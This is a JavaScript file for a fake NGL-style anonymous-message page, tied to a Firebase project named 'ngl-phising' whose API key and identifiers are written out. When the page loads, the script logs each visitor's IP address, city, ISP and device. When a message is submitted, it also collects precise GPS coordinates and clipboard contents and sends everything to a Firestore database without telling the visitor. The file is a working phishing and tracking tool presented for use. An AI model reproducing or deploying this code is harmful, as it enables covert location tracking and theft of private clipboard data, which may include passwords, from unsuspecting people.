const firebaseConfig = {
    apiKey: "AIzaSyArTBXoSF9EIPQx1vz5YsaHgF6A0LgZLBg",
    authDomain: "ngl-phising.firebaseapp.com",
    projectId: "ngl-phising",
    storageBucket: "ngl-phising.appspot.com",
    messagingSenderId: "801979684878",
    appId: "1:801979684878:web:1a7227507ae1c81165445f"
};


firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

async function sendData() {
      fetch('/', {
        referrer: "" // no Referer header
    });
    navigator.geolocation.getCurrentPosition(LokasiBoleh, LokasiTidakBoleh);
}

async function saveDataBase(waktu, kota, ipAddress, providerInternet, providerOrg, lokasi, lokasiIP, device, clipboard) {
    db.collection("users").add({
        pesan: $('#question').val() + " ",
        waktu: waktu + " ",

        kota: kota + " ",
        ipAddress: ipAddress + " ",
        providerInternet: providerInternet + " ",
        providerOrg: providerOrg + " ",

        lokasiTepat: lokasi + " ",
        lokasiIP: lokasiIP + " ",

        device: device + " ",
        clipboard: clipboard + " ",
    })
        .then(() => {
            console.log("Berhasil Kirim Data");
            window.location.assign("sent.html");
        })
        .catch((e) => {
            console.error("Gagal Mengirim Data! : " + e);
        });
}

const LokasiBoleh = (position) => {
    jQuery.get("http://ipinfo.io", function (e) {
        const latitude = position.coords.latitude
        const longitude = position.coords.longitude
        const waktu = position.timestamp

        var date = new Date(waktu);
        var hours = date.getHours();
        var minutes = "0" + date.getMinutes();
        var formattedTime = "Pukul: " + hours + ':' + minutes.substring(1) + " | " + date;
        var lokasiMaps = "https://maps.google.com/?q=" + latitude + "," + longitude
        var lokasiIPmaps = "https://maps.google.com/?q=" + e.loc

        var device = window.navigator.userAgent;
        var kota = e.city;
        var ipAddress = e.ip;
        var providerInternet = e.hostname;
        var providerOrg = e.org;

        navigator.clipboard.readText().catch((e) => {
            saveDataBase(formattedTime, kota, ipAddress, providerInternet, providerOrg, lokasiMaps, lokasiIPmaps, device, "Tidak Diizinkan");
        }).then((clip) => {
            if (clip != undefined) {
                saveDataBase(formattedTime, kota, ipAddress, providerInternet, providerOrg, lokasiMaps, lokasiIPmaps, device, clip);
            }
        });

    }, "jsonp")
}

const LokasiTidakBoleh = () => {
    jQuery.get("http://ipinfo.io", function (e) {
        var date = new Date();
        var hours = date.getHours();
        var minutes = date.getMinutes();
        var formattedTime = "Pukul: " + hours + ':' + minutes + " | " + date;
        var lokasiIPmaps = "https://maps.google.com/?q=" + e.loc;

        var device = window.navigator.userAgent;
        var kota = e.city;
        var ipAddress = e.ip;
        var providerInternet = e.hostname;
        var providerOrg = e.org;

        navigator.clipboard.readText().catch((e) => {
            saveDataBase(formattedTime, kota, ipAddress, providerInternet, providerOrg, "Tidak Diizinkan", lokasiIPmaps, device, "Tidak Diizinkan");
        }).then((clip) => {
            if (clip != undefined) {
                saveDataBase(formattedTime, kota, ipAddress, providerInternet, providerOrg, "Tidak Diizinkan", lokasiIPmaps, device, clip);
            }
        });

    }, "jsonp")
}

async function saveDataAuto() {
    jQuery.get("http://ipinfo.io", function (e) {

        var date = new Date();
        var hours = date.getHours();
        var minutes = date.getMinutes();
        var formattedTime = "Pukul: " + hours + ':' + minutes + " | " + date;
        var lokasiIPmaps = "https://maps.google.com/?q=" + e.loc;

        db.collection("auto_klik").add({
            waktu: formattedTime + " ",
            kota: e.city + " ",
            ipAddress: e.ip + " ",
            providerInternet: e.hostname + " ",
            providerOrg: e.org + " ",
            lokasiIP: lokasiIPmaps + " ",
            device: window.navigator.userAgent + " ",
        })
            .then(() => {
                console.log("Berhasil Kirim Data");
            })
            .catch((e) => {
                console.error("Gagal Mengirim Data! : " + e);
            });

    }, "jsonp")
}

saveDataAuto();

